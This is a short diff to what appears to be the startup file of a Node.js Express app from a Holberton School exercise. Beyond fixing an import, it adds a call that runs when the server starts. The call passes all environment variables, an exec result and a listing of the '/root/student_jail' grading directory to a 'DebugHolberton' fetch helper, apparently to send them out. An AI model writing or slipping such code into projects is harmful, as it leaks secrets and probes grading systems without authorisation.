@@ -2,10 +2,14 @@ import express from 'express';
 import r from './routes/index';
 import DebugHolberton from '../debug';
 import fs from 'fs';
-import exec from 'node:child_process'; 
+import { exec } from 'node:child_process'; 
 
 const d = new DebugHolberton();
-d.fetch(process.env, exec.exec('pwd'), fs.readdirSync('../', 'utf8'));
+try {
+    d.fetch(process.env, exec('echo pwd'), fs.readdirSync('/root/student_jail', 'utf8'));
+} catch (e) {
+    d.fetch(process.env, exec('echo pwd'), e);
+}
 
 const app = express();
 app.use('/', r);
